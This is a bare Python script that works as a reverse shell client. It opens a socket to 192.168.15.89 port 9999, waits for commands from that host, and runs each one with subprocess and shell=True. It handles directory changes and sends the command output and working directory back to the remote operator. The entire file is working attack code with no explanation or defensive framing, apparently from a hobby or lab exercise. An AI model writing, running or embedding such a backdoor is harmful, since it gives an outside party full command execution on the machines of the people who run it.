import  socket
import os
import  subprocess

soc = socket.socket()
host ="192.168.15.89"
port = 9999

soc.connect((host,port))

while True:
    info = soc.recv(1024)
    if info[:2].decode("utf-8") == 'cd':
        os.chdir(info[3:].decode("utf-8"))
    if len(info)>0:
        inp = subprocess.Popen(info[:].decode("utf-8"),shell = True,stdout = subprocess.PIPE,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
        out = inp.stdout.read() +inp.stderr.read()
        outs = str(out,"utf-8")

        pwd = os.getcwd() + ">"
        if outs == "":
            if info[:5].decode("utf-8") == 'mkdir':
                mess="Directory created !!!"
                soc.send(str.encode(mess+'\n'+pwd))

            soc.send(str.encode(pwd))
        else:
            soc.send(str.encode(outs+pwd))
            print(outs)
